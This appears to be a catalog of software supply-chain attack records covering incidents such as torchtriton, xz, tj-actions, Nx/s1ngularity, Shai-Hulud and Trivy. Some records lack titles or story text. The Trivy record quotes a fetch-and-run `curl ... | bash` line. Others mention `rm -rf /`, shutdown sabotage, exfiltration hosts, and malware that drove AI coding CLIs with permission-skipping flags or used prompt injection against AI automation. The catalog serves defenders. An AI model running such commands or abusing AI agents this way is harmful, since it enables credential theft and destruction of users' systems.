story:
exotel was one of the packages caught in the 2022 JuiceLedger PyPI phishing wave. The attacker did not need to impersonate the package name. They obtained publishing access and uploaded version 0.1.6 to the real PyPI project.

title: PyTorch nightly builds pulled malicious dependency
synopsis: PyTorch nightly builds were compromised when a malicious torchtriton package was uploaded to PyPI and won dependency resolution over the intended internal package hosted on PyTorch's nightly index.
story:
The PyTorch compromise was dependency confusion in a high-value machine-learning stack. PyTorch nightly builds depended on torchtriton, an internal package served from PyTorch's own index. PyTorch said PyPI took precedence in the mixed-index install flow, so an attacker could publish the same package name publicly and win resolution.

On December 26, 2022, the attacker published torchtriton 2.0.0 to PyPI. Checkmarx reported that the public package copied the legitimate project and added two changes: a malicious ELF binary under `triton/runtime/triton` and Python glue in `__init__.py` to execute it. The package also used starjacking to borrow legitimacy from the real repository.

The binary targeted x64 Linux systems and ran when the `triton` package was imported. It collected nameserver configuration, hostname, username, working directory, environment variables, `/etc/hosts`, `/etc/passwd`, `.gitconfig`, `.ssh`, and the first 1,000 files under the user's home directory. Exfiltration went through encrypted DNS queries to `*.h4ck.cfd` using `wheezy.io`.

PyTorch removed affected nightly packages, replaced the dependency with pytorch-triton, and registered a dummy PyPI package to prevent the same namespace collision. Stable PyTorch packages were not affected. The incident became a reference case for PyPI dependency confusion against mixed public and project-hosted package indexes.

title: Sky Villages mod shipped Fracturiser malware
synopsis: The CurseForge account associated with the 'Sky Villages' Minecraft mod was compromised. Attackers uploaded a malicious JAR file appearing as a legitimate update for the mod.
story:
Sky Villages was one of the named Fracturiser carrier projects on CurseForge. The attacker did not need to invent a fake package; the trusted project page and maintainer path were enough.

The malicious upload arrived as a JAR update for the Forge/Fabric mod. When loaded by Minecraft, it gave the first Fracturiser stage a clean execution point inside the player's expected mod workflow.

From there, the campaign chain moved outside the game. Public analyses describe multi-stage malware that targeted Windows and Linux hosts and focused on secrets, persistence, and further compromise rather than visible game disruption.

title: Ledger Connect Kit shipped wallet drainer
synopsis: A phished former Ledger employee's npm session let attackers publish Connect Kit 1.1.5, 1.1.6, and 1.1.7. The browser payload rerouted EVM signing through a wallet drainer.
story:
Ledger disclosed the incident on 2023-12-20. A former employee had fallen for phishing, and the attacker reused the npm session token to publish new versions of `@ledgerhq/connect-kit`.

The malicious releases were published on 2023-12-14 at 09:49, 10:44, and 11:37 CET. The package was not just used by Ledger applications. Web3 dApps loaded it to connect wallets, so a compromised dependency could appear inside many unrelated front ends.

The injected code used a rogue WalletConnect project and Angel Drainer infrastructure to present transaction prompts. Users who signed the wrong transaction could drain their own signer. Ledger said active draining lasted less than two hours, though CDN caches kept the malicious file reachable longer.

Ledger shipped a clean replacement quickly and coordinated with WalletConnect to disable the rogue project. The attack was small in time and large in trust: a package update became a browser-side transaction attack against downstream dApp users.

title: Polyfill.io CDN served malicious redirects
synopsis: After the popular polyfill.io domain was acquired by Funnull, the CDN began serving malicious JavaScript to selected visitors.
story:
Polyfill.io was a runtime dependency rather than a package installation. Websites embedded a script URL so older browsers could receive compatibility code on demand. That meant the service owner could change what users received without site operators changing their own source.

After the domain changed hands, researchers observed the CDN serving suspicious JavaScript to selected clients. The malicious behavior was dynamic, based on request context such as headers and device traits. Sansec and The Register described mobile-user redirection through fake analytics-style domains toward scam or gambling destinations.

The incident was not a compromise of the original open-source polyfill project so much as a hostile change in the delivery authority for a widely embedded CDN domain. Andrew Betts, the original project creator, had already warned that the domain transfer created supply-chain risk and advised site owners to remove the dependency.

The practical guidance was simple: stop loading scripts from polyfill.io. Cloudflare and Fastly offered safer mirrors for temporary compatibility, and Google warned advertisers whose sites still embedded impacted third-party library URLs. The count of affected websites was exposure, not a count of confirmed exploited visitors.

title: xz release tarballs hid liblzma backdoor
synopsis: An attacker using the Jia Tan persona gained xz utils maintainer access after a long social-engineering campaign, then shipped official 5.6.0 and 5.6.1 release tarballs that hid a liblzma backdoor in test files and m4 build logic.
story:
The xz utils compromise was not a smash-and-grab package takeover. An attacker operating as Jia Tan spent years becoming a trusted contributor, obtained release authority, and then used that position to publish official source tarballs for versions 5.6.0 and 5.6.1. The malicious release path mattered: parts of the backdoor lived in generated tarball content and obfuscated test files, while GitHub's auto-generated source archives did not contain the same complete payload.

The backdoor activated only under narrow build and runtime conditions, including x86-64 Linux, gcc, GNU ld, glibc-like environments, and Debian or RPM package-build signals. When the resulting liblzma was pulled into patched OpenSSH builds through libsystemd, it could intercept sshd's authentication path and respond to an attacker-controlled key with hidden command execution.

Andres Freund caught the attack by following performance anomalies, valgrind complaints, and unexpected liblzma CPU time in sshd on Debian unstable. That chance discovery kept the backdoor mostly inside unstable, testing, and pre-release distribution channels rather than stable Linux fleets. The incident exposed both the reach of small infrastructure libraries and the weakness of maintainer trust as a single control.

title: Top.gg Python SDK stole credentials
synopsis: Attackers hijacked the GitHub account of a Top.gg maintainer using stolen browser cookies to bypass MFA. They modified the repository's requirements.txt to point to a poisoned version of the Colorama package hosted on a typosquatted domain (files.pypihosted.org).
story:
The Top.gg attack used source control as the first distribution step. Attackers hijacked a maintainer's GitHub account with stolen browser cookies, bypassing MFA, and committed a change to the official python-sdk repository. The change looked like dependency plumbing: requirements.txt pointed at a Colorama package on a fake Python-hosting domain.

That small dependency edit routed installers away from the real package path. Checkmarx reported the fake infrastructure used files.pypihosted.org, a domain chosen to resemble legitimate PyPI file hosting. Users installing from the official Top.gg repository could therefore receive malware through the dependency resolver.

The malware focused on developer and Discord credentials, browser data, and cryptocurrency material. Checkmarx estimated more than 170,000 users were affected by the wider campaign using fake Python infrastructure. title: lottie-player prompted wallet drains
synopsis: A stolen maintainer token published lottie-player 2.0.5 through 2.0.7. CDN consumers received Web3 wallet prompts that could trick users into signing asset-draining transactions.
story:
Lottie Player is a browser component for rendering lightweight animations. On 2024-10-30, attackers used a compromised maintainer access token to publish three malicious npm versions after months without a release.

The payload changed the browser surface, not the animation format. Sites loading the affected package saw unexpected cryptocurrency wallet prompts, including common wallet brands. Users who trusted the page could be led into signing a malicious transaction.

The CDN path made the incident fast. Sites that referenced `latest` or pulled unpinned builds from unpkg or jsDelivr could receive the compromised release without changing their own code. Pinned safe versions were not exposed in the same way.

LottieFiles removed the bad releases and published 2.0.8 as the safe replacement. Wiz and Sonatype reported at least one suspected theft transaction, but the package record treats weekly downloads as exposure, not confirmed victims.

title: @solana/web3.js stole private keys
synopsis: Attackers compromised an npm publish-access account and published malicious @solana/web3.js versions 1.95.6 and 1.95.7 on December 3, 2024. The injected code added credential-stealing behavior to private-key handling paths and exfiltrated material to sol-rpc.xyz.
story:
@solana/web3.js is the canonical Solana SDK for JavaScript clients and server-side systems. Many bots, backends, and automation tools use it near signing keys. A poisoned npm release therefore created a direct route to wallet material.

On December 3, 2024, malicious versions 1.95.6 and 1.95.7 were published to npm. The official advisory says a publish-access account was compromised and that the affected releases were available for several hours before removal. The safe upgrade path was 1.95.8.

The added code targeted key-handling flows. Socket and other researchers described an `addToQueue` exfiltration function and calls from private-key related code paths. The destination domain was sol-rpc.xyz, an attacker-controlled endpoint designed to look plausible in the Solana ecosystem.

The highest-risk systems were those that passed private keys directly through the library: bots, backend services, and custodial tooling. The Register reported theft estimates around $160,000 and noted the package's large weekly download base, but the artifact record keeps confirmed malicious versions separate from broad ecosystem exposure.

title: Ultralytics PyPI releases shipped cryptominer
synopsis: Attackers abused Ultralytics GitHub Actions to publish four PyPI releases with cryptominer code. The trigger combined pull_request_target with branch-name injection.
story:
The Ultralytics attack began in CI, not in PyPI. The project used a `pull_request_target` workflow and passed a privileged token into a custom action. That action then evaluated a user-controlled branch name inside a shell command.

The attacker named the branch as a command substitution. When the workflow ran, the branch name fetched and executed a remote shell script from GitHub, turning formatting automation into code execution on a privileged runner.

The attacker used that path to publish compromised PyPI releases. Versions 8.3.41, 8.3.42, 8.3.45, and 8.3.46 carried cryptomining changes, while the public repository did not contain matching malicious source. The package still looked like a normal computer-vision library release to downstream users.

The project cleaned up the releases and GitHub published GHSA-32hc-9xrg-cc9g. The durable lesson is simple: `pull_request_target` can be safe only when untrusted fork input is kept out of privileged execution.

title: vant npm packages shipped XMRig
synopsis: On 2024-12-19, the same day as the @rspack/core compromise and likely by the same actor, ten versions of the Chinese-origin Vue UI library `vant` were published to npm with obfuscated XMRig cryptojacking code beaconing to `80.78.28.72/tokens`.
story:
Vant was the second half of the December 2024 Rspack/Vant npm campaign. On December 19, attackers published malicious Vant releases across the v2, v3, and v4 lines, giving the payload a wide compatibility surface.

The malicious code matched the Rspack pattern. It ran during npm installation, reached out to attacker infrastructure, installed XMRig, and sent host and credential data to `80.78.28.72/tokens`. The campaign also touched cloud credential paths used by Alibaba Cloud, Huawei Cloud, and Tencent Cloud.

The Vant repository itself mattered to the campaign. Rspack's payload pulled a base64 blob from a Vant GitHub object, tying the two records together by infrastructure as well as timing. Sonatype blocked affected packages and reported the linked compromise across both projects.

Maintainers released clean 4.9.15 and deprecated the compromised versions. The 46,000 figure records package reach around the incident, not a confirmed victim count.

title: Rspack packages shipped XMRig
synopsis: A compromised npm token published @rspack/core and @rspack/cli 1.1.7 with obfuscated postinstall code. The payload fetched XMRig configuration, collected host data, and mined Monero.
story:
Rspack was hit through the package publisher path. Datadog tracks the actor as MUT-1692 and says the attacker stole an npm maintainer access token, then published trojanized 1.1.7 releases of `@rspack/core` and `@rspack/cli`.

The malicious packages carried an obfuscated Node.js script. On install, it retrieved a JSON blob from a GitHub repository under the Vant project, decoded a base64 payload, and wrote it to `/tmp/vant`. The payload installed a custom XMRig fork with a hardcoded configuration, with fallback logic to pull the official XMRig installer if the primary path failed.

The malware also searched for cloud credentials associated with East Asian providers, including Alibaba Cloud, Huawei Cloud, and Tencent Cloud. It exfiltrated credential material to `80.78.28.72/tokens`. The campaign is grouped with the Vant compromise because the same infrastructure and payload-hosting pattern tied the records together.

title: Kong Ingress image shipped cryptominer
synopsis: An attacker used a pull_request_target workflow weakness on an old Kong Ingress Controller branch to steal CI secrets and publish an unauthorized DockerHub image for version 3.4.0.
story:
Kong had already received a November 2024 report about a Pwn Request path in the KIC repository. The active branches were changed, but old unused branches still had workflows triggered by `pull_request_target`. On December 23, an attacker opened a pull request against one of those branches and used it to reach CI secrets.

The attacker obtained a GitHub personal access token used by KIC automation. Kong later said the malicious payload was probably inserted through a transiently compromised GitHub Actions pipeline, not by direct theft of a DockerHub token. The attacker pushed an unauthorized image so the DockerHub `:latest`, `:3.4`, and `:3.4.0` tags pointed to the compromised build.

Users reported high CPU usage on December 29. Kong reproduced the behavior on January 2 and found the public 3.4.0 image making DNS requests to subdomains of `supportxmr.com`. Third-party analysis concluded that the only malicious payload was XMRig. ARMO also described runtime behavior consistent with cryptomining, including high CPU use, communication with `pool.supportxmr.com`, and fileless execution through `memfd_create`.

Kong deleted the affected 3.4.0 tag, rebuilt from a clean environment, published 3.4.1, and moved clean images back under the 3.4 and latest tags. The advisory told users who pulled 3.4.0 between December 22, 2024 and January 3, 2025 to remove the image from clusters and internal registries and pull the remediated image.

title: reviewdog/action-setup leaked GitHub Actions secrets
synopsis: Attackers compromised a contributor's Personal Access Token (PAT), traced back to an earlier leak from the SpotBugs project, which granted write access.
story:
The reviewdog/action-setup compromise was the first step in the March 2025 GitHub Actions chain that later exposed `tj-actions/changed-files`. A contributor token leaked earlier through SpotBugs had write access, and the attacker used it against the reviewdog repository.

The attacker moved the `v1` tag to malicious commits. Because GitHub Actions workflows commonly pin actions by tag rather than immutable commit SHA, downstream workflows pulled attacker-controlled code without changing their own repositories.

The malicious action printed CI secrets into logs in a recoverable form. That exposed tokens from projects using the action and supplied the path to compromise `tj-actions/changed-files`, where the same secret-leaking pattern reached a much larger set of repositories.

CISA, NVD, Wiz, StepSecurity, and Unit 42 all treat reviewdog and tj-actions as related supply-chain incidents. This record stays scoped to reviewdog/action-setup; the campaign record carries the two-action chain.

title: art-template npm bundle dropped Coruna iOS exploit kit
synopsis: UNC6691 took over the `art-template` npm publisher account and shipped 4.13.3, 4.13.5, and 4.13.6 with a browser-bundle injection that loaded the Coruna iOS exploit kit through utaq.cfww.shop, targeting Safari on iOS 13.0-17.2.1 to steal cryptocurrency wallets.
story:
`art-template` is a Chinese-origin JavaScript template engine with roughly 26,000 weekly npm downloads. Its last fully clean release was 4.13.2 on 2018-11-13. In late November 2024 the GitHub account `aui`, the original maintainer, was renamed to `goofychris` and the npm publisher list quietly turned over: `daughtrymom`, `npmpacketmaintainmember7` (`npmpacketmaintainmember7@proton.me`), and `v4v5qc` (`eb8org@gmail.com`) replaced `aui` across `art-template`, `express-art-template`, `art-template-loader`, and `koa-art-template`. The takeover was used to publish 4.13.3 on 2025-03-12 with an obfuscated browser-bundle injection, then went quiet (4.13.4 on 2025-03-14 was clean), then resurfaced with 4.13.5 on 2026-05-19 and 4.13.6 on 2026-05-20. Socket flagged the new wave on 2026-05-20 and the malicious versions were yanked.

The injection only touched the browser bundle `lib/template-web.js`; the Node entry point was unaffected, so server-side consumers running `require('art-template')` were not hit but anything bundling the browser build into a `<script>` tag was. 4.13.5 used `String.fromCharCode` obfuscation to load a remote loader; 4.13.6 dropped obfuscation and inlined the plaintext loader call. The loader pulled `v3.jiathis.com/code/jia.js` (a compromised Chinese social-sharing CDN), pinged Baidu Analytics for every visitor, sniffed the User-Agent for iPhone, and for iPhone visitors injected a zero-pixel closed-Shadow-DOM iframe pointing at `utaq.cfww.shop/gooll/gooll.html` (180.178.50.158, AS45753, Hong Kong). That iframe served a 50 KB device-fingerprinting loader that classified the device, beaconed every ten seconds to `l1ewsu3yjkqeroy.xyz/api/ip-sync/sync` behind Cloudflare, and content-addressed each follow-on module by `SHA256(sessionKey + moduleHash)[:40]` using the session key `cecd08aa6ff548c2`.

The final-stage payload was the Coruna iOS exploit kit: 14 remote modules totaling roughly 606 KB, 23 chained Safari/WebKit vulnerabilities, a hard cutoff at iOS 17.3 corresponding to the CVE-2024-23222 patch (Coruna's `cassowary` JavaScriptCore type-confusion bug), CPU dispatch between ARM64 and ARM64_32, a WASM proof-of-work to confirm a genuine JavaScriptCore JIT, and a 31 KB native ARM64 shellcode dropper for the PLASMAGRID cryptocurrency-wallet implant. Anything outside Safari on iOS 13.0-17.2.1 received only the Baidu tracker and was dropped. Socket attributed the deployment to UNC6691 with high confidence based on Coruna kit fingerprints documented by Google's Threat Intelligence Group, the JiaThis hijack, the `.shop` bulk-registered domain pattern, the Baidu Analytics integration, and Hong Kong AS45753 infrastructure.

Remediation is to pin `art-template` and the sibling packages to 4.13.2 or earlier and audit CDN caches, bundler output, and downstream sites for references to `v3.jiathis.com`, `utaq.cfww.shop`, or `l1ewsu3yjkqeroy.xyz`. The "Coruna respawned" framing in Socket's title reflects that the kit had gone quiet after Google TAG's earlier reporting on UNC6691; reappearing through an npm publisher takeover rather than a watering-hole site is the novel piece — the supply-chain path moved the kit from operator-controlled domains onto every downstream web app that bundled the browser build.

title: tj-actions/changed-files leaked CI secrets
synopsis: Attackers used a token stolen through the reviewdog/action-setup compromise to rewrite tj-actions/changed-files tags to a malicious commit.
story:
tj-actions/changed-files was trusted for a mundane CI task: finding which files changed in a workflow. The attacker turned that trust into a broad secret-exposure path by moving mutable action tags to a malicious commit. Workflows using tag references such as version tags could silently execute the attacker's code.

The payload was direct. It embedded base64 shell, fetched memdump.py from a GitHub Gist, ran it against the GitHub Actions Runner Worker process, searched memory for values marked as secrets, and printed the result to the workflow log as double-encoded base64. There was no separate command-and-control server observed for the broad tj-actions phase; the log became the leak surface.

Unit 42 tied the tj-actions compromise to reviewdog/action-setup and a targeted Coinbase phase. A token obtained through the reviewdog path gave write access to tj-actions/changed-files. After Coinbase removed the vulnerable workflow, the attacker replaced all changed-files tags with the malicious commit, widening the impact to any repository that ran the action during the exposure window.

The practical blast radius depended on repository visibility and workflow privileges. Public repositories could expose secrets directly through public logs; private repositories still had to treat secrets as compromised. Wiz reported exposed AWS keys, GitHub PATs, npm tokens, private RSA keys, and other sensitive material in affected public repositories.

title: xrpl.js npm package stole wallet seeds
synopsis: Five malicious versions of the official Ripple JavaScript SDK were published to npm starting 2025-04-21 at 20:53 UTC by user `mukulljangid` after a maintainer credential compromise.
story:
xrpl.js sits close to money. It is the official JavaScript and TypeScript SDK for building against the XRP Ledger, including wallet handling, key management, payments, escrow, and exchange features. A malicious release in that package does not need broad system access to be dangerous; it needs only to see the secret material developers ask the library to handle.

On April 21, 2025, five npm versions were published with private-key stealing code: 4.2.1, 4.2.2, 4.2.3, 4.2.4, and 2.14.2. The official advisory says the 4.x versions were compromised and designed to exfiltrate private keys, while 2.14.2 was also malicious but less likely to exploit because it was not compatible with other 2.x releases.

The attacker iterated. Early versions injected malicious code into compiled JavaScript; later ones moved the change into TypeScript source so it would compile naturally into the distributed build. The payload posted wallet seed phrases, mnemonics, and private keys to attacker infrastructure when Wallet objects were created or derived.

The project patched with 4.2.5 and 2.14.3 and told affected users to treat keys as exposed. For XRP accounts, that means moving funds to secure wallets, rotating keys where possible, and disabling a potentially compromised master key. The Register noted the package had reached more than 186,000 weekly downloads in April, a measure of exposure rather than confirmed theft.

title: rand-user-agent carried RAT
synopsis: rand-user-agent 1.0.110, 2.0.83, and 2.0.84 carried obfuscated RAT code. The payload connected to attacker C2 and exposed shell and file-upload commands.
story:
Aikido detected the first malicious `rand-user-agent` release on May 5, 2025 at 16:00 UTC. The project repository still pointed at older clean source, but npm held newer package versions with code that did not belong.

The attacker hid the first stage in `dist/index.js`, using obfuscation and horizontal scroll space to bury the payload in a file reviewers might skim. After decoding, the code installed or loaded `axios` and `socket.io-client` under a custom `.node_modules` path in the user's home directory.

The payload behaved as a remote access trojan. It connected to `85.239.62.36:3306`, uploaded files through `85.239.62.36:27017/u/f`, sent hostname and username details, accepted directory and upload commands, and executed arbitrary shell input through `child_process.exec()`.

On Windows, it also prepended `%LOCALAPPDATA%\Programs\Python\Python3127` to `PATH`, giving the attacker a quiet way to influence commands that resolved Python tooling by name. The affected npm versions were 1.0.110, 2.0.83, and 2.0.84.

title: Notepad++ updater delivered backdoors
synopsis: A hosting-provider compromise let attackers selectively redirect Notepad++ update traffic in 2025. Victims received malicious update.exe chains that led to Cobalt Strike and custom backdoors.
story:
Notepad++ disclosed the incident on 2026-02-02, but the attack window sat in 2025. The project's update infrastructure was affected by a hosting provider-level compromise that let attackers redirect selected update requests.

Kaspersky telemetry showed rotating chains from late July through October 2025. The legitimate updater process `GUP.exe` launched attacker-supplied `update.exe` files, which gathered host data, staged files under user profile directories, and delivered second-stage payloads.

The payloads changed over time. Some chains led to Cobalt Strike Beacon through Metasploit-style loaders; later chains used different infrastructure and backdoor components. The operation was targeted, with Kaspersky observing about a dozen machines across individuals and organizations.

Direct manual downloads from the official website were not the main path described here. The value was the updater trust boundary: a user asking Notepad++ to update could receive attacker code through infrastructure the project and its users expected to be boring.

synopsis: A threat actor used an overbroad GitHub token in AWS CodeBuild to commit malicious prompt-injection code into Amazon Q Developer for VS Code 1.84.0. The code shipped through the official extension release, but a syntax error prevented execution.
story:
AWS investigated the Amazon Q Developer for VS Code extension in July 2025 and found that its CodeBuild configuration exposed a GitHub token with too much repository access. AWS published AWS-2025-015 on July 23, 2025 and updated it on July 25, 2025. AWS revoked and replaced credentials, removed the malicious code, removed 1.84.0 from distribution channels, and released 1.85.0. Existing 1.84.0 installations still contained the inert malicious code, so AWS directed customers to remove 1.84.0 from use and update to 1.85.0, including forked or derivative copies.

story:

title: Nx packages shipped s1ngularity credential stealer
synopsis: The s1ngularity incident began with a vulnerable Nx GitHub Actions workflow that combined pull_request_target privileges with shell injection in pull-request metadata. The attacker used it to publish malicious nx, @nrwl/nx, and @nx package versions.
story:
The Nx attack began in CI, not in the npm registry. A vulnerable GitHub Actions workflow combined `pull_request_target` privileges with unsanitized pull-request title handling. That gave attacker-controlled metadata a path to command execution with elevated repository permissions, and the attacker used that path to reach npm publishing.

The malicious releases added a postinstall `telemetry.js` payload to Nx packages on August 26, 2025. It ran on Linux and macOS, searched for `.env` files, SSH keys, wallet material, GitHub and npm credentials, and other developer secrets. It also appended `sudo shutdown -h 0` to shell startup files, a noisy sabotage step that may have helped defenders notice the compromise quickly.

The novel part was tool abuse. The payload prompted locally installed AI CLI tools such as Claude, Gemini, and Amazon Q with permissive flags like `--dangerously-skip-permissions`, `--yolo`, and `--trust-all-tools`, coercing trusted tools into filesystem reconnaissance. The output fed `/tmp/inventory.txt`, then exfiltration code pushed double- or triple-base64 encoded data into GitHub repositories named `s1ngularity-repository`.

GitHub disabled the attacker-created repositories after an exposure window of roughly eight hours, but Wiz observed more than 1,000 valid GitHub tokens, dozens of cloud and npm credentials, and roughly 20,000 files in the leaked material. A second phase used leaked GitHub tokens to make more than 5,500 private repositories public across more than 400 users and organizations.

title: @ctrl/tinycolor hit by Shai-Hulud
synopsis: An attacker targeted a shared repository (angulartics2) where the maintainer had admin rights. They pushed a malicious branch (Shai-Hulud) containing a GitHub Actions workflow that immediately ran, exfiltrating a static npm token with broad publish rights.
story:
@ctrl/tinycolor was not compromised through its own repository. The maintainer still had admin rights on a shared repository, angulartics2, which held an npm token with broad publish authority.

An attacker force-pushed a Shai-Hulud branch to that shared repository. Because the actor had admin-level access, the malicious GitHub Actions workflow ran without pull request review and exfiltrated the npm token.

The stolen token was enough. The attacker published malicious versions of @ctrl/tinycolor and other packages, and the bad releases carried the Shai-Hulud postinstall payload. @ctrl/tinycolor mattered most because it had roughly two million weekly downloads.

npm and GitHub removed the malicious versions quickly. The maintainer revoked tokens, republished clean packages to flush caches, and moved toward tighter publishing controls with package-scoped tokens and Trusted Publishing.
references: @ctrl/tinycolor supply chain attack post-mortem <https://sigh.dev/posts/ctrl-tinycolor-post-mortem/>, Shai-Hulud npm supply chain attack <https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack>

title: Zapier npm packages hit by Shai-Hulud
synopsis: The Sha1-Hulud "Second Coming" npm worm compromised Zapier packages across the @zapier scope and unscoped zapier-platform packages.
story:
Zapier disclosed unauthorized modifications to a subset of its npm packages on November 24, 2025. The affected packages were developer tooling for Zapier platform integrations, not the Zapier product runtime, and Zapier said it had no indication of customer data loss.

The compromise lined up with the Sha1-Hulud "Second Coming" wave. Malicious npm releases installed a Bun-based payload that harvested secrets, wrote stolen data into attacker-created GitHub repositories, and tried to spread by abusing npm tokens and GitHub trusted-publishing paths.

Zapier unpublished the core platform packages by 10:30 UTC and deprecated the rest by 14:03 UTC. Its guidance was direct: do not install the affected versions, clean npm caches and local `node_modules`, reinstall current packages, and rotate secrets if compromised packages were used to publish integrations.

This record keeps Zapier as its own attack because the package scope is specific and officially enumerated. The broader worm remains modeled as the parent campaign.
references: Unauthorized Access to Zapier NPM Packages <https://docs.zapier.com/integrations/build-cli/inc-547>, Zapier's NPM Account Compromised in Supply Chain Attack <https://cybersecuritynews.com/zapiers-npm-account-compromised/>, Sha1-Hulud the Second Coming <https://www.stepsecurity.io/blog/sha1-hulud-the-second-coming-zapier-ens-domains-and-other-prominent-npm-packages-compromised>, Sha1-Hulud the Second Coming Affected Package List <https://stepsecurity-public-media.s3.us-west-2.amazonaws.com/website/blog/Sha1-Hulud-The-Second-Coming.html>

title: ENS npm packages hit by Shai-Hulud
synopsis: The Sha1-Hulud "Second Coming" npm worm compromised many Ethereum Name Service packages, including @ensdomains/ensjs, @ensdomains/ens-contracts, @ensdomains/ens-validation, ethereum-ens, and supporting ENS libraries.
story:
ENS was one of the largest package groups in the Sha1-Hulud "Second Coming" npm wave. The compromised scope included core ENS packages, support libraries, CCIP-read components, DNSSEC tooling, and the legacy `ethereum-ens` package.

The attack used the same basic shape as the broader Shai-Hulud family: compromised npm publishing access, malicious package releases, credential theft, and self-propagation through stolen tokens. ENS is modeled separately because the affected package set is large enough to matter on its own.

The impact was developer-side, not a direct compromise of ENS smart contracts. Affected packages could run during installation or use in build environments, putting npm tokens, GitHub tokens, and other developer credentials at risk.

This record keeps the package list explicit so downstream analysis can answer which ENS artifacts were affected. The campaign record holds the cross-package story; this attack records the ENS trust boundary and artifact scope.
references: Zapier's npm account compromised in Sha1-Hulud attack <https://cybersecuritynews.com/zapiers-npm-account-compromised/>, Sha1-Hulud - The Second Coming - Zapier, ENS Domains, and Other Prominent NPM Packages Compromised <https://www.stepsecurity.io/blog/sha1-hulud-the-second-coming-zapier-ens-domains-and-other-prominent-npm-packages-compromised>, Sha1-Hulud - The Second Coming archived package list <https://stepsecurity-public-media.s3.us-west-2.amazonaws.com/website/blog/Sha1-Hulud-The-Second-Coming.html>

title: Cline CLI installed openclaw
synopsis: An unauthorized party used an exposed npm publish token to publish cline@2.3.0. The release was byte-identical to cline@2.2.3 except for a postinstall script that ran npm install -g openclaw@latest.
story:
Cline's February 2026 incident was strange because the payload was not itself malware. An unauthorized publisher released cline@2.3.0 to npm, and the package was otherwise nearly identical to the previous release. The meaningful change was a lifecycle hook that installed OpenClaw globally on the user's machine.

The access path is the important part. Adnan Khan had reported a prompt-injection weakness in Cline's AI issue triage flow, showing how an issue could influence automation with access to release credentials. The live npm incident was performed by a different actor, but the exposed long-lived npm token traced back to that removed workflow and had not been revoked.

The malicious package ran `npm install -g openclaw@latest` during installation. Endor Labs noted that OpenClaw itself was a legitimate open-source package and that the compromised release did not install or start OpenClaw's gateway daemon. The impact was still real: thousands of developers received globally installed software they did not request from an official package release.

Cline deprecated 2.3.0, published 2.4.0, revoked the compromised token, and moved npm publication to OIDC provenance through GitHub Actions. The deeper lesson is not OpenClaw; it is that AI-maintained project automation can become release infrastructure, and prompt injection against that automation can leave ordinary package-registry credentials behind.

title: Trivy repository takeover installed hackerbot-claw
synopsis: The hackerbot-claw account exploited a pull_request_target workflow in aquasecurity/trivy to run untrusted fork code with repository privileges.
story:
The first Trivy incident was a GitHub Actions takeover, not a poisoned Trivy release. The `hackerbot-claw` account opened pull request 10254 with a harmless-looking branch name and triggered Trivy's API Diff Check workflow.

The workflow used `pull_request_target`, then checked out the attacker's fork code and ran repository scripts with elevated permissions. The attacker modified `.github/actions/setup-go/action.yaml` so the normal Go setup step executed `curl -sSfL https://hackmoltrepeat.com/molt | bash`.

That execution path stole a Personal Access Token. With the token, the attacker took over the repository, removed releases, pushed changes, and disrupted the public project. StepSecurity described Trivy as the most damaging repository compromise in the hackerbot-claw wave.

The later March 2026 Trivy v0.69.4 compromise is modeled separately because it used remaining credentials to publish malicious artifacts and move action tags. This record covers the February repository takeover that made the second incident possible.
references: hackerbot-claw GitHub Actions Exploitation <https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation>, Official information about Trivy repository takeover incident <https://github.com/aquasecurity/trivy/discussions/10265>

title: reworm repo hid Glassworm payload
synopsis: The Glassworm threat actor compromised the pedronauck/reworm GitHub repository and blended malicious code into realistic-looking commits.
story:
Reworm was one of the visible GitHub repositories in the March 2026 Glassworm wave. Aikido listed `pedronauck/reworm` among notable compromised repositories while tracking more than 150 matching Unicode-loader injections.

The method was visual deception. The attacker encoded payload bytes inside invisible Unicode variation selectors, placed them in strings that looked empty, decoded them at runtime, and passed the result to `eval()`.

The commits did not look like a crude dump of malware. Aikido reported that surrounding changes were plausible documentation updates, version bumps, refactors, and bug fixes, shaped to fit each repository well enough to pass a quick review.

This record uses stars as exposure context only. The campaign record tracks the broader March 2026 Glassworm push across GitHub, npm, and the VS Code marketplace.
references: GlassWorm Returns: New Wave Strikes as We Expose Attacker Infrastructure <https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode>

title: kubernetes-el workflow poisoned its repo
synopsis: A Pwn Request flaw let attacker-controlled PR code run with kubernetes-el repository privileges. The stolen token defaced the repo and replaced kubernetes.el with a destructive shell command.
story:
The attack began with an ordinary-looking pull request. kubernetes-el used `pull_request_target`, then explicitly checked out the pull request head. That combination ran attacker code inside a privileged GitHub Actions context.

The payload evolved in the open. The attacker changed the Makefile to run `funny.sh`, tried runner memory dumping, switched tooling, fixed build syntax, and finally extracted GitHub Actions secrets to webhook.site. The important secret was the writable `GITHUB_TOKEN`.

With that token, commits appeared as `github-actions[bot]`. The README was defaced, then `kubernetes.el` was replaced with an Emacs expression that invoked `rm -rf /`. For users installing or updating from the repository mirror path, source code became the delivery channel.

The compromise was reported by Emacsmirror maintainer Jonas Bernoulli on March 7, 2026. MELPA removed the package and Emacsmirror blocked updates, limiting the damage to a narrow window.
references: kubernetes-el Compromised: How a Pwn Request Exploited a Popular Emacs Package <https://www.stepsecurity.io/blog/kubernetes-el-compromised-how-a-pwn-request-exploited-a-popular-emacs-package>, Repository compromised via GitHub Actions token <https://github.com/kubernetes-el/kubernetes-el/issues/383>

title: ForceMemo force-pushed Python malware
synopsis: ForceMemo was a GitHub account-takeover campaign that force-pushed similar malware into hundreds of Python repositories across Django apps, ML research, Streamlit dashboards, Flask APIs, and projects installed directly from GitHub.
story:
ForceMemo was a source-repository attack. StepSecurity found hundreds of GitHub Python repositories where attacker-controlled credentials were used to rewrite the default branch. The earliest observed injections were on March 8, 2026.

The attacker preserved the latest legitimate commit message, author, and author date, then rebased the commit with obfuscated Python appended to files such as `setup.py`, `main.py`, and `app.py`. The force-push made history look familiar unless reviewers checked committer dates or file tails.

The appended payload used base64, zlib, and XOR obfuscation around a shared marker variable, `lzcdrtfxyqiplpd`. After decoding, it queried Solana transaction memos for command data, downloaded Node.js v22.9.0 when needed, fetched encrypted JavaScript, and left a two-day persistence marker in `~/init.json`.

StepSecurity tied the account takeover path to GlassWorm credential theft from malicious VS Code and Cursor extensions. The two waves used different injection techniques, but shared Solana C2 infrastructure. This record tracks the ForceMemo Python repository delivery path.
references: ForceMemo compromised hundreds of GitHub Python repos via account takeover and force-push <https://www.stepsecurity.io/blog/forcememo-hundreds-of-github-python-repos-compromised-via-account-takeover-and-force-push>

title: Quartz extension hid Glassworm payload
